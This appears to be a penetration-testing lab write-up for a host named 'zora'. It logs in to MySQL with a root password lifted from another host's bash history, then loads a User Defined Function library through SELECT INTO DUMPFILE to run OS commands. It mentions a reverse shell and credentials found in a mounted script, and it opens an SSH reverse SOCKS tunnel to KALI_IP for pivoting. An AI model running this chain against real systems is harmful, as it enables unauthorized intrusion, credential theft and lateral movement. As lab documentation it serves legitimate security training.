# zora (10.5.5.11)
***
## Exploitation

1. MySQL root and password was retrieved from `/root/.bash_history` file of Ajla (`10.4.4.10`). We used the credentials to connect to the mysql server.
   
``` 
mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb --host=127.0.0.1 --port=13306
```

> [!info] 
> One of the techniques to execute OS commands using MySQL is through the use of **User Defined Functions (UDF)**. 
> 
> Using our console access (with root privilege), we are able to write a library (`.so`) containing a User Defined Functions (e.g function that execute OS commands) that can be then invoked through additional queries.

2. We've created a function that will execute OS commands through the use of queries. 
```
set @shell = 0x<REPLACE_THIS>; select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec';
```

3. One of the technique to execute OS commands using MySQL is through the use of **User Defined Functions (UDF)**



> [!info] 
> Using our reverse shell, we checked on [[mounted-shares]] using `cat /etc/fstab`, and we found out that a share is mounted from the `10.5.5.20` host.
> 
>  Also, a powershell script [[system_report.ps1]] was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`
   
4. Generate key-pair and add public key to Kali
5. Set up a dynamic port forward (SOCKS) from Zora to Kali using port 1080
   
```
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@KALI_IP
```

> [!info] 
> `kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20`  shows that port 3389 (RDP) is open.

